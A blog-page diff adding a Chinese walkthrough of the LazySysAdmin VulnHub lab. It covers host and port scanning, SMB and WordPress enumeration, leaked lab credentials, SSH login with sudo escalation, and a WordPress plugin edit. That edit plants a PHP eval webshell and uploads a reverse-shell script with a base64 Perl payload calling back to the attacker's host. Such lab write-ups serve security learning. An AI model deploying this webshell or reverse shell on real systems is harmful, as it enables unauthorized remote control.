@@ -299,7 +299,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">2</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">4</span></a>
 
   </li>
 
@@ -364,6 +364,621 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/10/LazySysAdmin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/08/10/LazySysAdmin/" class="post-title-link" itemprop="url">LazySysAdmin渗透实战</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-10 18:02:50 / 修改时间：18:15:40" itemprop="dateCreated datePublished" datetime="2019-08-10T18:02:50+08:00">2019-08-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">7.1k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">6 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>直接使用VMware打开即可，使靶机与攻击机位于同一网段即可。</p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p><strong>（1）netdiscover</strong></p>
+<blockquote>
+<p>netdiscover是基于ARP的网络扫描工具</p>
+<p>ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以以主动模式扫描主机。用户还可以根据网络稳定性，调整发包速度和数量。</p>
+</blockquote>
+<p><strong>payload</strong>:<code>netdiscover -r 192.168.64.0/24</code></p>
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cnetdiscover.png" alt="1"></p>
+<p><strong>（2）nmap</strong></p>
+<p><strong>payload</strong>:<code>nmap -sP 192.168.64.0/24</code></p>
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cnmap.png" alt="1"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><strong>payload</strong>:<code>nmap -A -oN  /root/Desktop/Lazysysadmin_info.csv 192.168.64.143</code></p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"># Nmap <span class="number">7.70</span> scan initiated Tue Jul <span class="number">30</span> <span class="number">06</span>:<span class="number">25</span>:<span class="number">24</span> <span class="number">2019</span> <span class="built_in">as</span>: nmap -A -oN /root/Desktop/Lazysysadmin_info.csv <span class="number">192.168</span><span class="number">.64</span><span class="number">.143</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.64</span><span class="number">.143</span></span><br><span class="line">Host is up (<span class="number">0.00064</span>s latency).</span><br><span class="line">Not shown: <span class="number">994</span> closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh         OpenSSH <span class="number">6.6</span><span class="number">.1</span>p1 Ubuntu <span class="number">2</span>ubuntu2<span class="number">.8</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="type">ssh</span>-hostkey: </span><br><span class="line">|   <span class="type">1024</span> b5:<span class="number">38</span>:<span class="number">66</span>:<span class="number">0</span>f:a1:ee:cd:<span class="number">41</span>:<span class="number">69</span>:<span class="number">3</span>b:<span class="number">82</span>:cf:ad:a1:f7:<span class="number">13</span> (DSA)</span><br><span class="line">|   <span class="type">2048</span> <span class="number">58</span>:<span class="number">5</span>a:<span class="number">63</span>:<span class="number">69</span>:d0:da:dd:<span class="number">51</span>:cc:c1:<span class="number">6</span>e:<span class="number">00</span>:fd:<span class="number">7</span>e:<span class="number">61</span>:d0 (RSA)</span><br><span class="line">|   <span class="type">256</span> <span class="number">61</span>:<span class="number">30</span>:f3:<span class="number">55</span>:<span class="number">1</span>a:<span class="number">0</span>d:de:c8:<span class="number">6</span>a:<span class="number">59</span>:<span class="number">5</span>b:c9:<span class="number">9</span>c:b4:<span class="number">92</span>:<span class="number">04</span> (ECDSA)</span><br><span class="line">|<span class="type">_</span>  <span class="number">256</span> <span class="number">1</span>f:<span class="number">65</span>:c0:dd:<span class="number">15</span>:e6:e4:<span class="number">21</span>:f2:c1:<span class="number">9</span>b:a3:b6:<span class="number">55</span>:a0:<span class="number">45</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   open  http        Apache httpd <span class="number">2.4</span><span class="number">.7</span> ((Ubuntu))</span><br><span class="line">|<span class="type">_http</span>-generator: Silex v2<span class="number">.2</span><span class="number">.7</span></span><br><span class="line">| <span class="type">http</span>-robots.txt: <span class="number">4</span> disallowed entries </span><br><span class="line">|<span class="type">_</span>/old/ /test/ /TR2/ /Backnode_files/</span><br><span class="line">|<span class="type">_http</span>-server-header: Apache/<span class="number">2.4</span><span class="number">.7</span> (Ubuntu)</span><br><span class="line">|<span class="type">_http</span>-title: Backnode</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios-ssn Samba smbd <span class="number">3.</span>X - <span class="number">4.</span>X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">445</span>/tcp  open  netbios-ssn Samba smbd <span class="number">4.3</span><span class="number">.11</span>-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line"><span class="number">6667</span>/tcp open  irc         InspIRCd</span><br><span class="line">| <span class="type">irc</span>-info: </span><br><span class="line">|   <span class="type">server</span>: Admin.local</span><br><span class="line">|   <span class="type">users</span>: <span class="number">1</span></span><br><span class="line">|   <span class="type">servers</span>: <span class="number">1</span></span><br><span class="line">|   <span class="type">chans</span>: <span class="number">0</span></span><br><span class="line">|   <span class="type">lusers</span>: <span class="number">1</span></span><br><span class="line">|   <span class="type">lservers</span>: <span class="number">0</span></span><br><span class="line">|   <span class="type">source</span> <span class="keyword">ident</span>: nmap</span><br><span class="line">|   <span class="type">source</span> host: <span class="number">192.168</span><span class="number">.64</span><span class="number">.131</span></span><br><span class="line">|<span class="type">_</span>  error: Closing link: (nmap@<span class="number">192.168</span><span class="number">.64</span><span class="number">.131</span>) [Client exited]</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:DE:C8:B4 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="type">4</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service <span class="keyword">Info</span>: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|<span class="type">_clock</span>-skew: mean: <span class="number">-8</span>d02h13m08s, deviation: <span class="number">5</span>h46m24s, median: <span class="number">-7</span>d22h53m09s</span><br><span class="line">|<span class="type">_nbstat</span>: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| <span class="type">smb</span>-os-discovery: </span><br><span class="line">|   <span class="type">OS</span>: Windows <span class="number">6.1</span> (Samba <span class="number">4.3</span><span class="number">.11</span>-Ubuntu)</span><br><span class="line">|   <span class="type">Computer</span> name: lazysysadmin</span><br><span class="line">|   <span class="type">NetBIOS</span> computer name: LAZYSYSADMIN\x00</span><br><span class="line">|   <span class="type">Domain</span> name: \x00</span><br><span class="line">|   <span class="type">FQDN</span>: lazysysadmin</span><br><span class="line">|<span class="type">_</span>  System <span class="built_in">time</span>: <span class="number">2019</span><span class="number">-07</span><span class="number">-22</span>T21:<span class="number">32</span>:<span class="number">29</span>+<span class="number">10</span>:<span class="number">00</span></span><br><span class="line">| <span class="type">smb</span>-security-mode: </span><br><span class="line">|   <span class="type">account_used</span>: guest</span><br><span class="line">|   <span class="type">authentication_level</span>: user</span><br><span class="line">|   <span class="type">challenge_response</span>: supported</span><br><span class="line">|<span class="type">_</span>  message_signing: disabled (dangerous, but default)</span><br><span class="line">| <span class="type">smb2</span>-security-mode: </span><br><span class="line">|   <span class="type">2</span><span class="number">.02</span>: </span><br><span class="line">|<span class="type">_</span>    Message signing enabled but not required</span><br><span class="line">| <span class="type">smb2</span>-<span class="built_in">time</span>: </span><br><span class="line">|   <span class="type">date</span>: <span class="number">2019</span><span class="number">-07</span><span class="number">-22</span> <span class="number">07</span>:<span class="number">32</span>:<span class="number">29</span></span><br><span class="line">|<span class="type">_</span>  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">0.64</span> ms <span class="number">192.168</span><span class="number">.64</span><span class="number">.143</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results <span class="built_in">at</span> https://nmap.org/submit/ .</span><br><span class="line"># Nmap done <span class="built_in">at</span> Tue Jul <span class="number">30</span> <span class="number">06</span>:<span class="number">25</span>:<span class="number">48</span> <span class="number">2019</span> -- <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="built_in">in</span> <span class="number">23.64</span> seconds</span><br></pre></td></tr></table></figure>
+
+<p>从中可看出：</p>
+<p>22端口——ssh远程登录协议</p>
+<p>80端口——http服务</p>
+<p>139端口——NETBIOS Session Service端口,用于提供文件共享服务,主要用于企业内部网之间互相访问,如文件共享或打印等等.</p>
+<p>445端口——有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机</p>
+<p>3306端口——mysql服务</p>
+<p>6667端口——一种透过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。</p>
+<h4 id="enum4linux扫描"><a href="#enum4linux扫描" class="headerlink" title="enum4linux扫描"></a>enum4linux扫描</h4><blockquote>
+<p>Windows平台上曾经出现过一个第三方的信息枚举工具 enum.exe，其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。enum4linux作为其Linux平台的复刻作品，全面兼容了enum.exe的所有功能。对于安全防护不足的SMB/SAMBA服务，enum4linux可直接枚举重要信息，甚至帮助我们发现潜在漏洞的存在。</p>
+</blockquote>
+<p><strong>payload</strong>:<code>enum4linux 192.168.64.143</code></p>
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cenumerate.png" alt="1"></p>
+<p>获取到远程主机共享了print和share两个文件夹。</p>
+<h4 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h4><img src width height>
+
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cdirbuster1.png" alt="1"></p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cdirbuster2.png" alt="1"></p>
+<p>可看出，主要web应用有phpMyAdmin和WordPress</p>
+<h4 id="WPScan扫描"><a href="#WPScan扫描" class="headerlink" title="WPScan扫描"></a>WPScan扫描</h4><p>参考文章：<a href="https://www.freebuf.com/sectool/174663.html" target="_blank" rel="noopener">WPScan使用攻略</a></p>
+<blockquote>
+<p>采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>
+</blockquote>
+<p><strong>扫描WordPress站点</strong>:<code>wpscan -u http://192.168.64.143/wordpress/</code></p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cwpscan_u.png" alt="1"></p>
+<img src width height>
+
+<p>仅获得服务器的基本信息（PHP版本、Apache以及系统的信息），并没有其他的插件，不存在漏洞利用点。</p>
+<p><strong>枚举WordPress用户</strong>：<code>wpscan -u http://192.168.64.143/wordpress/ --enumerate u</code></p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cwpscan_user.png" alt="1"></p>
+<img src width height>
+
+<h4 id="Web站点信息"><a href="#Web站点信息" class="headerlink" title="Web站点信息"></a>Web站点信息</h4><p>（1）togie可能是什么的账户名</p>
+<p>（2）WPScan枚举出admin和ulgrmbcg两个用户名</p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/wp1.png" alt="1"></p>
+<img src width height>
+
+<h4 id="Samba协议登录"><a href="#Samba协议登录" class="headerlink" title="Samba协议登录"></a>Samba协议登录</h4><p>由上面enumlinux扫描获取到两个共享文件夹，访问:</p>
+<p><strong>windows</strong>下:<code>\\192.168.64.143\share$</code></p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/Samba_1.png" width="700" height>
+
+<p><strong>linux</strong>下:<code>smbclient //192.168.64.143/share$</code></p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/smb_linux.png" width="700">
+
+<p>经简单审计WordPress的源码，发现信息：</p>
+<p><strong>wp-config.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'Admin'</span>);</span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'TogieMYSQL12345^^'</span>);</span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>获得数据库的用户与密码，登录phpMyAdmin发现权限受限，无法利用。</p>
+<p><strong>deets.txt</strong></p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CBF Remembering <span class="keyword">all</span> these passwords.</span><br><span class="line">Remember <span class="keyword">to</span> remove this <span class="keyword">file</span> <span class="keyword">and</span> update your password <span class="keyword">after</span> we push <span class="keyword">out</span> the server.</span><br><span class="line">Password <span class="number">12345</span></span><br></pre></td></tr></table></figure>
+
+<p>可能为某种服务的密码</p>
+<h4 id="SSH登录-方法1"><a href="#SSH登录-方法1" class="headerlink" title="SSH登录(方法1)"></a>SSH登录(方法1)</h4><p>尝试<code>ssh togie@192.168.64.143</code></p>
+<p>输入password:12345</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/ssh1.png" width="700" height>
+
+<p>togie权限很低，但是发现具有sudo权限</p>
+<blockquote>
+<p><em>sudo</em>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具</p>
+</blockquote>
+<p>输入<code>sudo su</code>，成功提权……</p>
+<h4 id="web渗透-方法2"><a href="#web渗透-方法2" class="headerlink" title="web渗透(方法2)"></a>web渗透(方法2)</h4><p>整理前面获取的信息:</p>
+<ol>
+<li>未知的密码<code>12345</code></li>
+<li>未知的用户名<code>togie</code></li>
+<li>数据库的用户名<code>Admin</code>，密码<code>TogieMYSQL12345^^</code></li>
+</ol>
+<p>（1）WordPress后台登录:<code>http://192.168.64.143/wordpress/wp-login.php</code></p>
+<p>尝试用户名<code>Admin</code>，密码<code>TogieMYSQL12345^^</code>，登录成功，进入到WordPress后台</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/WordPress_admin.png" width="700">
+
+<p>（2）点击插件-&gt;编辑-&gt;选择Hello Dolly</p>
+<blockquote>
+<p>Hello Dolly不是普通的插件，它象征着一代人希望和热情，浓缩成Louis Armstrong的四个字：你好，多莉。在启用后，在您站点后台每个页面的右上角都可以看到一句来自《俏红娘》音乐剧的英文原版台词。</p>
+</blockquote>
+<p>（3）修改hello.php文件，在末尾添加file_put_contents(‘shell.php’,’<?php eval($_POST[pass]);?>‘);</p>
+<p>在当前目录下生成webshell，蚁剑连接即可</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/蚁剑.png" width="700" height>
+
+<p>（4）上传反弹shell脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123;</span><br><span class="line">$path = execute(<span class="string">"which $pr"</span>);</span><br><span class="line"><span class="keyword">return</span> ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">@exec($cfe,$res);</span><br><span class="line">$res = join(<span class="string">"\n"</span>,$res);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">$res = @shell_exec($cfe);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@system($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@passthru($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span>(!@feof($f)) &#123;</span><br><span class="line">$res .= @fread($f,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@pclose($f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123;</span><br><span class="line">@fputs($fp,@base64_decode($text));</span><br><span class="line">@fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yourip = <span class="string">"192.168.64.131"</span>; <span class="comment">//修改这里</span></span><br><span class="line">$yourport = <span class="string">"4444"</span>; <span class="comment">// 修改这里</span></span><br><span class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>);</span><br><span class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>.</span><br><span class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>.</span><br><span class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>.</span><br><span class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>.</span><br><span class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>.</span><br><span class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>.</span><br><span class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;</span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect);</span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问后接受到shell</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/kali.png" width="700" height>
+
+<p>但经过尝试，如</p>
+<p><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><code>su togie</code></p>
+<p>提示must be run from a terminal，没办法走方法2，从而使用方法1直接登陆ssh切换到管理员账号</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
+<li><a href="https://xz.aliyun.com/t/2789#toc-7" target="_blank" rel="noopener">Vulnhub-LazySysAdmin 通关指南</a></li>
+<li><a href="https://blog.csdn.net/qq_33438733/article/details/82874640" target="_blank" rel="noopener">带妹玩转Vulnhub【一】</a></li>
+<li><a href="http://192.168.8.134/wordpress/wp-content/themes/twentyfourteen/404.php" target="_blank" rel="noopener">Lazysysadmin渗透实战</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/10/Lampiao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/08/10/Lampiao/" class="post-title-link" itemprop="url">Lampiao渗透实战</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-10 17:52:11 / 修改时间：18:02:29" itemprop="dateCreated datePublished" datetime="2019-08-10T17:52:11+08:00">2019-08-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">3.7k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">3 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
